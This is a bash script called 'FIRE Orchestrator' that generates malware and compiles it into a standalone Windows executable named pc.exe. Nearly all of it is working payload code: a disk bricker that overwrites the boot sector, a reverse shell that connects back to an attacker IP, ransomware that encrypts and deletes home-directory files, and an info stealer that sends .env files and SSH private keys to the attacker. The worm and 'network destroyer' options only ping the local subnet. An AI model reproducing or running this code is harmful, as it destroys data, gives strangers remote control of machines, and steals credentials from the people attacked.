cat > FIRE << 'EOF'
#!/bin/bash

# --- AESTHETICS ---
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
NC='\033[0m'
clear
cat << "EOF"
  __      __  _    _  _        _____            _   _
  \ \    / / | |  | || |      / ____|    /\    | \ | |
   \ \  / /  | |  | || |     | |        /  \   |  \| |
    \ \/ /   | |  | || |     | |       / /\ \  | . ` |
     \  /    | |__| || |____ | |____  / ____ \ | |\  |
      \/      \____/ |______| \_____|/_/    \_\|_| \_|
       [ FIRE // Orchestrator v5 - Self-Contained ]
EOF


ATTACKER_IP="YOUR_IP_ADDRESS" # <-- CHANGE THIS
ATTACKER_PORT="4444"


VENV_DIR="./fire_venv"

if [ ! -d "$VENV_DIR" ]; then
    echo -e "${Y}[*] Creating isolated Python environment...${NC}"
    python3 -m venv "$VENV_DIR"
fi


source "$VENV_DIR/bin/activate"

if ! python3 -c "import PyInstaller" &> /dev/null; then
    echo -e "${Y}[*] PyInstaller not found in venv. Installing...${NC}"
    pip install pyinstaller > /dev/null 2>&1
fi

WORK_DIR="./fire_build"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

generate_payload() {
    local type=$1
    local final_name="pc.exe"
    echo -e "${Y}[*] Generating Python payload for type: $type${NC}"

    case $type in
        1) 
            cat > "payload.py" << EOP
import os, sys
if sys.platform == "win32":
    with open(r"\\.\PhysicalDrive0", "r+b") as f:
        f.seek(0)
        f.write(b'\x00' * 512)
    os.system("shutdown /r /t 1 /f")
else:
    os.system("dd if=/dev/zero of=/dev/sda bs=446 count=1")
    os.system("reboot")
EOP
            ;;
        2) # BACKDOOR
            cat > "payload.py" << EOP
import os, sys, socket, subprocess, time
if sys.platform == "win32":
    CMD = f"powershell -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',$ATTACKER_PORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String);\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close()\""
    os.system(CMD)
else:
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('$ATTACKER_IP', $ATTACKER_PORT))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(['/bin/bash', '-i'])
        except:
            time.sleep(10)
EOP
            ;;
        3) # RANSOMWARE
            cat > "payload.py" << EOP
import os, base64, random, socket
from pathlib import Path
def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
key = os.urandom(16)
target_dir = Path.home()
ext = ".FIRE"
for root, _, files in os.walk(target_dir):
    for file in files:
        if file.endswith(('.jpg', '.png', '.doc', '.pdf', '.txt')):
            file_path = Path(root) / file
            try:
                with open(file_path, 'rb') as f: data = f.read()
                encrypted_data = xor_encrypt(data, key)
                with open(str(file_path) + ext, 'wb') as f: f.write(encrypted_data)
                os.remove(file_path)
            except: pass
with open(target_dir / 'READ_ME_FIRE.txt', 'w') as f:
    f.write(f"Your files are encrypted. Key: {base64.b64encode(key).decode()}")
EOP
            ;;
        4) # WORM
            cat > "payload.py" << EOP
import os, socket, subprocess, time
def get_subnet():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return '.'.join(ip.split('.')[:-1])
subnet = get_subnet()
for i in range(1, 255):
    ip = f"{subnet}.{i}"
    if os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0:
        print(f"[+] Found host: {ip}", flush=True)
EOP
            ;;
        5) # INFO STEALER
            cat > "payload.py" << EOP
import os, glob, json, socket, base64
from pathlib import Path
def exfiltrate(data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('$ATTACKER_IP', 8080))
        s.sendall(data)
        s.close()
    except: pass
data_bundle = {}
for file in glob.glob(str(Path.home() / ".env")):
    data_bundle['.env'] = open(file).read()
for file in glob.glob(str(Path.home() / ".ssh/id_rsa")):
    data_bundle['id_rsa'] = open(file).read()
exfiltrate(json.dumps(data_bundle).encode())
EOP
            ;;
        6) # NETWORK DESTROYER
            cat > "payload.py" << EOP
import os, socket, subprocess, sys, time
def get_subnet():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return '.'.join(ip.split('.')[:-1])
subnet = get_subnet()
for i in range(1, 255):
    ip = f"{subnet}.{i}"
    if os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0:
        print(f"[!] Targeting: {ip}", flush=True)
EOP
            ;;
    esac

    
    echo -e "${Y}[*] Compiling to a standalone executable...${NC}"
    
    pyinstaller --onefile --noconsole --name="$final_name" payload.py

    if [ -f "dist/$final_name" ]; then
        echo -e "${G}[+] Success! Malware created as 'dist/$final_name'.${NC}"
        mv "dist/$final_name" ..
    else
        echo -e "${R}[!] Failed to create .exe. Check for errors above.${NC}"
    fi
    
    cd ..
   
    rm -rf "$WORK_DIR"
}


echo -e "${B}SELECT PAYLOAD TYPE:${NC}"
echo "1) Bricker (Disk Destroyer)"
echo "2) Backdoor (Reverse Shell)"
echo "3) Ransomware (File Encryptor)"
echo "4) Worm (Network Spreader)"
echo "5) Info Stealer (Data Exfiltration)"
echo "6) Network Destroyer (Conceptual)"
read -p ">> " payload_choice

echo -e "\n${R}--- GENERATING PAYLOAD ---${NC}"
generate_payload "$payload_choice"


deactivate

echo -e "${G}>> OPERATION COMPLETE. Check the parent directory for 'pc.exe'.${NC}"
EOF
